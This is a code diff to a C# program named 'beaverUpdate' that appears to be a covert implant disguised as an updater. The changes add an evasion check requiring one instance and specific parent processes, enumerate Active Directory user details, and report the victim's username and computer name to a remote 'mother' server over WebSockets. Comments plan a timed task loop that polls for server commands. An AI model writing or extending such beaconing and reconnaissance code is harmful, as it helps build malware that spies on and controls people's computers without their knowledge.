@@ -5,14 +5,24 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Net.WebSockets;
+using System.Diagnostics;
+using System.Management;
 
 namespace beaverUpdate
 {
     internal class Program
     {
         static int timerail = 10;
+
         static async Task Main(string[] args)
         {
+            // protected start: one instance, specific parents
+            if (!Utilities.protectedStart())
+            {
+                Console.WriteLine("Unable to run due to security measures.");
+                return;
+            }
+
             // Ensure we're tracking state
             DatabaseHelper.EnsureTablesExist();
 
@@ -27,33 +37,30 @@ namespace beaverUpdate
 
             // Say hello to mother. 
             Console.WriteLine("Hello mother!");
-            HostInfo hostInfo = GetHostInfo();
+            Utilities.HostInfo hostInfo = Utilities.GetHostInfo();
+
+            try
+            {
+                AD.UserInfo userInfo = AD.GetUserInfo();
+                Console.WriteLine($"UserInfo: {userInfo.Name}");
+            } catch
+            {
+                Console.WriteLine("Not AD joined.");
+            }
+            
+
             Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
             await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");
 
-            // Start working through pending tasks
+            // Start working through pending tasks on a timer, in a thread
+            // :memsql: - lastTask(#), lastRun(time)
+            // have numbered list of tasks, iterate in loop only start next # if it's been 20 minutes since last run
+            // look for server messages between?
 
         }
 
         // supplementary
-        static HostInfo GetHostInfo()
-        {
-            string ComputerName = Environment.GetEnvironmentVariable("COMPUTERNAME");
-            string UserName = Environment.GetEnvironmentVariable("USERNAME");
-            return new HostInfo(ComputerName, UserName);
-        }
-
-        class HostInfo
-        {
-            public string ComputerName { get; set; }
-            public string UserName { get; set; }
-
-            public HostInfo(string computerName, string userName)
-            {
-                ComputerName = computerName;
-                UserName = userName;
-            }
-        }
+        
 
         static async Task SendMessage(string clientName, string message)
         {
